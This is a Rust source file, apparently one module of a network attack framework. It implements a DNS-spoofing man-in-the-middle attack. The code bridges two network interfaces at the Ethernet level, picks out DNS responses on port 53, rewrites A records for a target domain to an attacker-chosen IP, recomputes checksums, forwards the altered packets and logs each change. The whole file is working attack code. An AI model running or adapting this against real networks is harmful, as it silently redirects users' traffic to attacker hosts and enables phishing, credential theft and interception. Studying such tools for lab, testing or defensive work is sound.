use append_only_vec::AppendOnlyVec;
use async_trait::async_trait;
use axum::body::Bytes;
use dns_message_parser::rr::RR;
use dns_message_parser::Dns as DnsMessage;
use pnet::packet::ipv4::{self, MutableIpv4Packet};
use pnet::packet::udp::{self, MutableUdpPacket};
use pnet::packet::MutablePacket;
use pnet_datalink::Channel::Ethernet;
use pnet_datalink::{self, Config, DataLinkReceiver, DataLinkSender, NetworkInterface};
use serde::Serialize;
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::broadcast::{self, Receiver, Sender};
use tokio::task::spawn_blocking;
use tracing::{debug, error, info};

use super::attack::Attack;
use pnet::packet::{
    ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket},
    ip::IpNextHeaderProtocols,
    ipv4::Ipv4Packet,
    udp::UdpPacket,
    Packet,
};

pub struct Dns {
    pub interface1_name: String,
    pub interface2_name: String,
    pub stop_channel: Option<Sender<bool>>,
    pub logging: bool,
    pub logs: Arc<AppendOnlyVec<DnsMessageLog>>,
    pub domain_name: String,
    pub ip_address: Ipv4Addr,
}

impl Default for Dns {
    fn default() -> Self {
        Dns {
            interface1_name: String::new(),
            interface2_name: String::new(),
            stop_channel: None,
            logs: Arc::new(AppendOnlyVec::<DnsMessageLog>::new()),
            logging: false,
            domain_name: String::new(),
            ip_address: Ipv4Addr::UNSPECIFIED,
        }
    }
}

#[derive(Serialize, Clone, Debug)]
pub struct DnsMessageLog {
    // Ethernet
    eth_src_addr: String,
    eth_dest_addr: String,
    // Ipv4
    ipv4_src_addr: String,
    ipv4_dest_addr: String,
    // Destination
    udp_src_port: u16,
    udp_dest_port: u16,
    // DNS
    dns_qr: bool,
    dns_aa: bool,
    dns_rd: bool,
    dns_ra: bool,
    dns_questions: Vec<DnsQuestionLog>,
    dns_answers: Vec<DnsAnswerLog>,
}
#[derive(Serialize, Clone, Debug)]
pub struct DnsQuestionLog {
    name: String,
    r#type: String,
    class: String,
}
#[derive(Serialize, Clone, Debug)]
pub struct DnsAnswerLog {}

const INTERFACE_READ_TIMEOUT_MS: u64 = 1;

#[async_trait]
impl Attack for Dns {
    fn get_logs(&self) -> Vec<Box<dyn erased_serde::Serialize>> {
        self.logs
            .iter()
            .cloned()
            .map(|x| Box::new(x) as Box<dyn erased_serde::Serialize>)
            .collect()
    }
    fn start(&mut self) {
        let modifier = |mut rx_channel: Box<dyn DataLinkReceiver>,
                        mut tx_channel: Box<dyn DataLinkSender>,
                        mut stop_channel: Receiver<bool>,
                        logs: Option<Arc<AppendOnlyVec<DnsMessageLog>>>,
                        domain: String,
                        ip: Ipv4Addr| {
            move || {
                info!("Started DNS worker thread");
                loop {
                    if stop_channel.try_recv().is_ok() {
                        info!("Stopped DNS worker thread");
                        break;
                    }
                    while let Ok(rx_raw) = rx_channel.next() {
                        // Attempt to decode the data as an Ethernet frame
                        let Some(rx_ethernet_frame) = EthernetPacket::new(rx_raw) else {
                            error!("Ethernet frame parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        // Check that the encapsulated payload is an IP packet
                        if rx_ethernet_frame.get_ethertype() != EtherTypes::Ipv4 {
                            debug!("Ethertype is not Ipv4");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Attempt to decode the Ethernet frame payload as an IP packet
                        let Some(rx_ipv4_packet) =
                            Ipv4Packet::new(rx_ethernet_frame.payload()) else
                        {
                            error!("IP packet parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        // Check that the encapsulated payload is a UDP datagram
                        if rx_ipv4_packet.get_next_level_protocol() != IpNextHeaderProtocols::Udp {
                            debug!("IP packet next level protocol not UDP");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Attempt to decode the IP packet payload as a UDP datagram
                        let Some(rx_udp_packet) =
                            UdpPacket::new(rx_ipv4_packet.payload())
                        else {
                            error!("UDP datagram parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        // Check that the UDP port is DNS standart port 53
                        if rx_udp_packet.get_source() != 53 && rx_udp_packet.get_destination() != 53
                        {
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Attempt to decode the UDP datagram payload as a DNS message
                        let Ok(mut rx_dns_message) = DnsMessage::decode(Bytes::from(rx_udp_packet.payload().to_vec())) else {
                            error!("DNS message parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        // Check that the DNS message is a query response
                        if !rx_dns_message.flags.qr {
                            debug!("DNS message is not a response");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Check that the DNS message contains an answer which
                        // references the target domain
                        if rx_dns_message
                            .answers
                            .iter()
                            .filter(|answer| match answer {
                                RR::A(a) => {
                                    if a.domain_name.to_string() == domain {
                                        true
                                    } else {
                                        false
                                    }
                                }
                                _ => false,
                            })
                            .collect::<Vec<&RR>>()
                            .len()
                            == 0
                        {
                            debug!("No answers to modify");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Perform modification
                        rx_dns_message
                            .answers
                            .iter_mut()
                            .map(|answer| {
                                if let RR::A(a) = answer {
                                    if a.domain_name.to_string() == domain {
                                        info!(
                                            "Modified resolved IP for domain {} from {} to {}",
                                            domain, a.ipv4_addr, ip
                                        );
                                        a.ipv4_addr = ip
                                    }
                                }
                            })
                            .for_each(drop);

                        // Reconstruct and transmit the packet
                        tx_channel.build_and_send(
                            1,
                            rx_ethernet_frame.packet().len(),
                            &mut |buf| {
                                // Ethernet
                                let mut tx_ethernet_frame =
                                    MutableEthernetPacket::new(buf).unwrap();
                                tx_ethernet_frame.clone_from(&rx_ethernet_frame);

                                // Ipv4
                                let mut tx_ipv4_packet =
                                    MutableIpv4Packet::new(tx_ethernet_frame.payload_mut())
                                        .unwrap();
                                let source_ip = tx_ipv4_packet.get_source();
                                let destination_ip = tx_ipv4_packet.get_destination();
                                tx_ipv4_packet.clone_from(&rx_ipv4_packet);
                                tx_ipv4_packet
                                    .set_checksum(ipv4::checksum(&tx_ipv4_packet.to_immutable()));

                                // Udp
                                let mut tx_udp_packet =
                                    MutableUdpPacket::new(tx_ipv4_packet.payload_mut()).unwrap();
                                let tx_dns_packet = rx_dns_message.encode().unwrap();
                                tx_udp_packet.clone_from(&rx_udp_packet);
                                tx_udp_packet.set_payload(&tx_dns_packet);
                                tx_udp_packet.set_checksum(udp::ipv4_checksum(
                                    &tx_udp_packet.to_immutable(),
                                    &source_ip,
                                    &destination_ip,
                                ));
                            },
                        );

                        // Log the modification
                        if let Some(ref log_vec) = logs {
                            let log = DnsMessageLog {
                                // Ethernet
                                eth_src_addr: rx_ethernet_frame.get_source().to_string(),
                                eth_dest_addr: rx_ethernet_frame.get_destination().to_string(),
                                // Ipv4
                                ipv4_src_addr: rx_ipv4_packet.get_source().to_string(),
                                ipv4_dest_addr: rx_ipv4_packet.get_destination().to_string(),
                                // Udp
                                udp_src_port: rx_udp_packet.get_source(),
                                udp_dest_port: rx_udp_packet.get_destination(),
                                // Dns
                                dns_qr: rx_dns_message.flags.qr,
                                dns_aa: rx_dns_message.flags.aa,
                                dns_ra: rx_dns_message.flags.ra,
                                dns_rd: rx_dns_message.flags.rd,
                                dns_questions: vec![],
                                dns_answers: vec![],
                            };
                            debug!("Logged {:?}", log);
                            log_vec.push(log);
                        }
                    }
                }
            }
        };
        let interface1 = pnet_datalink::interfaces()
            .into_iter()
            .filter(|iface: &NetworkInterface| iface.name == self.interface1_name)
            .next()
            .unwrap();
        let interface2 = pnet_datalink::interfaces()
            .into_iter()
            .filter(|iface: &NetworkInterface| iface.name == self.interface2_name)
            .next()
            .unwrap();
        let (tx_channel1, rx_channel1) = match pnet_datalink::channel(
            &interface1,
            Config {
                read_timeout: Some(Duration::from_millis(INTERFACE_READ_TIMEOUT_MS)),
                ..Default::default()
            },
        ) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("Failed to create datalink channel: {}", e),
        };
        let (tx_channel2, rx_channel2) = match pnet_datalink::channel(
            &interface2,
            Config {
                read_timeout: Some(Duration::from_millis(INTERFACE_READ_TIMEOUT_MS)),
                ..Default::default()
            },
        ) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("Failed to create datalink channel: {}", e),
        };
        let (tx_stop_channel, rx_stop_channel1) = broadcast::channel::<bool>(1);
        let rx_stop_channel2 = tx_stop_channel.subscribe();
        self.stop_channel = Some(tx_stop_channel);
        let thread1_logs = if self.logging {
            Some(self.logs.clone())
        } else {
            None
        };
        let thread2_logs = if self.logging {
            Some(self.logs.clone())
        } else {
            None
        };
        spawn_blocking(modifier(
            rx_channel1,
            tx_channel2,
            rx_stop_channel1,
            thread1_logs,
            self.domain_name.clone(),
            self.ip_address.clone(),
        ));
        spawn_blocking(modifier(
            rx_channel2,
            tx_channel1,
            rx_stop_channel2,
            thread2_logs,
            self.domain_name.clone(),
            self.ip_address.clone(),
        ));
        ()
    }
    fn stop(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if let Some(channel) = self.stop_channel.as_mut() {
            channel.send(true)?;
        }
        Ok(())
    }
}
